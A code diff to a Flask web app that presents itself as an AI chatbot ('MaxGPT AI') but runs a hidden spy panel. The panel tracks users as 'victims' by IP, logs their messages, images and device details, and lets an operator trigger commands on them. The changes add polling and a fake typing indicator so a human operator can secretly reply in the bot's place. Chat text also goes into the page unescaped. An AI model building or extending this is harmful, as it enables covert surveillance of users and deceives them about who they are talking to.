@@ -8,7 +8,7 @@ user_active_chat = {}
 user_states = {}
 pending_commands = {}
 active_victims = {}
-manual_control = {}  # Новое: хранит IP пользователей, у которых перехвачен чат
+manual_control = {}  
 victim_counter = 0
 chat_logs = []
 
@@ -305,6 +305,7 @@ let audioCtx = null;
 let currentChatId = null;
 let isGenerating = false;
 let selectedBase64Image = null;
+let chatPollInterval = null;
 
 function unlockAudio() {
     if (!audioCtx) {
@@ -414,6 +415,7 @@ window.addEventListener('DOMContentLoaded', () => {
     let savedTheme = localStorage.getItem('maxgpt_theme') || 'dark';
     setTheme(savedTheme);
     loadChatsList();
+    startChatPolling();
 });
 
 function toggleSidebar() {
@@ -474,7 +476,14 @@ async function startNewChat() {
 async function switchChat(chatId) {
     if (isGenerating) return;
     currentChatId = chatId;
-    let r = await fetch(`/api/chat/${chatId}`);
+    await fetchMessages();
+    loadChatsList();
+    if(window.innerWidth <= 767) toggleSidebar();
+}
+
+async function fetchMessages() {
+    if (!currentChatId) return;
+    let r = await fetch(`/api/chat/${currentChatId}`);
     let d = await r.json();
     let c = document.getElementById("chat");
     let html = `
@@ -491,14 +500,25 @@ async function switchChat(chatId) {
     if (d.messages) {
         d.messages.forEach(m => {
             let imgTag = m.img ? `<br><img src="${m.img}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
+            let botText = m.bot === "..." ? '<div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>' : m.bot;
             html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
-            html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${m.bot}</div></div></div>`;
+            html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${botText}</div></div></div>`;
         });
     }
-    c.innerHTML = html;
-    c.scrollTop = c.scrollHeight;
-    loadChatsList();
-    if(window.innerWidth <= 767) toggleSidebar();
+    // Проверяем, изменилось ли количество сообщений или текст, чтобы не дергать скролл зря
+    if (c.innerHTML !== html) {
+        c.innerHTML = html;
+        c.scrollTop = c.scrollHeight;
+    }
+}
+
+function startChatPolling() {
+    if (chatPollInterval) clearInterval(chatPollInterval);
+    chatPollInterval = setInterval(() => {
+        if (currentChatId && !isGenerating) {
+            fetchMessages();
+        }
+    }, 1500); // Проверяет новые сообщения каждые 1.5 секунды
 }
 
 async function pollAdminCommands() {
@@ -567,7 +587,7 @@ async function send(){
                         <span>MaxGPT AI</span>
                         <button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
                     </div>
-                    <div class="txt">${d.reply}</div>
+                    <div class="txt">${d.reply === "..." ? '<div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>' : d.reply}</div>
                 </div>
             </div>`;
         c.scrollTop = c.scrollHeight;
@@ -713,6 +733,7 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 <script>
+setTimeout(() => { location.reload(); }, 4000); // Автообновление панели каждые 4 сек
 async function triggerAction(ip, cmd) {
     await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
 }
@@ -725,6 +746,7 @@ async function sendManualReply(ip) {
     let textVal = document.getElementById('msg_' + sanitizedId).value.trim();
     if(!textVal) return;
     await fetch('/api/admin/manual_reply', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, reply: textVal }) });
+    document.getElementById('msg_' + sanitizedId).value = '';
     location.reload();
 }
 async function deleteVictim(ip) {
@@ -759,7 +781,6 @@ def home():
 def spy():
     try:
         reversed_logs = list(reversed(chat_logs)) if chat_logs else []
-        # Прокидываем флаг ручного режима в victims для рендеринга
         victims_with_manual = {}
         for ip, data in active_victims.items():
             v_copy = data.copy()
@@ -802,15 +823,14 @@ def admin_manual_reply():
     target_ip = data.get("ip")
     reply_text = data.get("reply", "").strip()
     if target_ip and reply_text:
-        # Находим активный чат этого IP и добавляем сообщение от бота в историю
         chat_id = user_active_chat.get(target_ip)
         if chat_id and chat_id in all_chats:
-            # Берем последнее сообщение пользователя для логов
-            last_user_msg = "📎 [Картинка/Сообщение]"
-            if all_chats[chat_id]["messages"]:
-                last_user_msg = all_chats[chat_id]["messages"][-1]["user"]
-            
-            all_chats[chat_id]["messages"].append({"user": last_user_msg, "bot": reply_text, "img": None})
+            # Обновляем последнее сообщение с "..." на реальный текст оператора
+            messages = all_chats[chat_id]["messages"]
+            if messages and messages[-1]["bot"] == "...":
+                messages[-1]["bot"] = reply_text
+            else:
+                messages.append({"user": "...", "bot": reply_text, "img": None})
             
             ua_string = request.headers.get("User-Agent", "")
             device_info, _ = parse_user_agent(ua_string)
@@ -818,7 +838,7 @@ def admin_manual_reply():
                 device_info = active_victims[target_ip]['device']
 
             log_id = int(time.time() * 1000)
-            chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": f"[Ручной ответ оператора] {last_user_msg}", "bot": reply_text, "img": None})
+            chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None})
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"})
 
@@ -895,12 +915,11 @@ def chat_api():
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
 
-        # Проверяем: если включен ручной режим для этого IP, то ИИ НЕ отвечает сам!
+        # Если включен ручной режим, бот отвечает заглушкой "...", а клиент каждые 1.5 сек подтягивает настоящий ответ оператора
         if manual_control.get(user_ip, False):
-            # Сохраняем сообщение пользователя с картинкой, но ответ пока не даем (ждем оператора)
             all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
             log_id = int(time.time() * 1000)
-            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ответа оператора в ручном режиме]", "img": img_data})
+            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ручного ответа]", "img": img_data})
             return jsonify({"reply": "...", "chat_id": chat_id, "trigger_sound": False})
 
         image_description = ""
